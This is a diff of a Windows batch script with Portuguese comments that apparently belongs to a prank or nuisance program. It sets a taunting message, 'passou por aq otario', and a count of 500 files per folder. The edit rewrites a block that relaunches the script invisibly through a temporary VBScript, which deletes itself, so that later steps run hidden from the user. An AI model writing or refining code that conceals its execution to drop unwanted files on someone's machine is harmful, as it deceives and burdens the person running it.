@@ -7,14 +7,17 @@ set texto=Lxzinn__ passou por aq otario KKKKKK
 set arquivos_por_pasta=500
 REM ====================
 
-REM ---- 1) Se não foi relançado com a flag, esconde e relança via VBS ----
-if /i not "%~1"=="__hidden__" (
-    set "vbs=%TEMP%\~rh_%RANDOM%.vbs"
-    echo CreateObject^("WScript.Shell"^).Run """%~f0"" __hidden__", 0, False > "!vbs!"
-    wscript //nologo "!vbs!"
-    del /f /q "!vbs!" >nul 2>&1
-    exit /b
-)
+REM ---- 1) Se NAO foi relancado com a flag, esconde e relanca via VBS ----
+if /i "%~1"=="__hidden__" goto :hidden
+
+REM ---- Aqui FORA do bloco if — parses de "()" nao atrapalham ----
+set "vbs=%TEMP%\~rh_%RANDOM%.vbs"
+echo CreateObject("WScript.Shell").Run """%~f0"" __hidden__", 0, False > "!vbs!"
+wscript //nologo "!vbs!"
+del /f /q "!vbs!" >nul 2>&1
+exit /b
+
+:hidden
 
 REM ---- 2) Daqui pra baixo roda escondido ----
 set "template=%TEMP%\_t_%RANDOM%.txt"
